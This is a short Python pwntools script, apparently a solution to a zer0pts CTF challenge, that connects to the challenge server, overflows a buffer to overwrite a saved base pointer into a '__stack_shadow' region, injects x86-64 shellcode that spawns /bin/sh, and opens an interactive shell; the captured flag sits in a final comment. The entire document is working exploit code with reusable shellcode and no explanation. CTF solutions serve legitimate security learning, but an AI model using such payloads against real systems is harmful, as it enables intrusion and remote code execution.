#/usr/bin/python3

import pwn
import sys

e = pwn.ELF('chall')
p = pwn.remote('pwn.ctf.zer0pts.com', 9011)
p.recvuntil("Data: ")
pld = 0x100*b"A"
pld += pwn.p64(e.symbols['__stack_shadow'] + 0x100)
p.sendline(pld)

p.recvuntil("Data: ")
pld = b"A"*8 + pwn.p64(e.symbols['__stack_shadow'] + 16)
pld += b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

p.sendline(pld)
p.interactive()

# zer0pts{1nt3rm3d14t3_pwn3r5_l1k3_2_0v3rwr1t3_s4v3d_RBP}
